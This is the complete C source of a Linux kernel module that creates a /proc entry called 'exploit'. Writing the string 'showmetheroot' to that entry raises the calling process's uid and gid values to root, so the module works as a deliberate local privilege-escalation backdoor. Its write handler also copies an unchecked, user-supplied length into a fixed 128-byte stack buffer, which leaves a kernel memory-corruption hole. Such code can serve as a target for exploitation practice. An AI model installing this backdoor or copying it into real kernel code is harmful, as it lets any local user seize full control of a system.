#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/cred.h>
#include <linux/uaccess.h>

static char buffer[128];

static ssize_t proc_write(struct file *seq, const char __user *data, 
		size_t len, loff_t *off)
{
	char buf[128];
	static int finished = 0;
	struct cred *new;

	if (finished) {
		printk("m_write end\n");
		finished = 0;
		return 0;
	}
	finished = 1;

	if (copy_from_user(buf, data, len)) {
		printk(KERN_ERR "copy from user error");
		return -EFAULT;
	}

	buf[len] = '\0';
	if (buf[len - 1] == '\n')
		buf[len - 1] = '\0';

	memset(buffer, 0, 128);
	strcpy(buffer, buf);

	if (!strcmp(buf, "showmetheroot"))
	{
		new = prepare_creds();
		new->uid.val = 0;
		new->gid.val = 0;
		new->suid.val = 0;
		new->sgid.val = 0;
		new->euid.val = 0;
		new->egid.val = 0;
		new->fsuid.val = 0;
		new->fsgid.val = 0;
		commit_creds(new);
		printk("root exploit\n");
	}

	return len;
}

static int proc_show(struct seq_file *m, void *v)
{
	seq_printf(m, "Enter String: [%s]\n", buffer);
	return 0;
}

static int proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, proc_show, NULL);
}

static const struct proc_ops proc_fops = {
	.proc_open = proc_open,
	.proc_read = seq_read,
	.proc_write = proc_write,
	.proc_lseek = seq_lseek,
	.proc_release = single_release
};


static int __init exproc_init(void)
{
	proc_create("exploit", 0, NULL, &proc_fops);
	return 0;
}

static void __exit exproc_exit(void)
{
	remove_proc_entry("exploit", NULL);
}

module_init(exproc_init);
module_exit(exproc_exit);

MODULE_LICENSE("GPL");
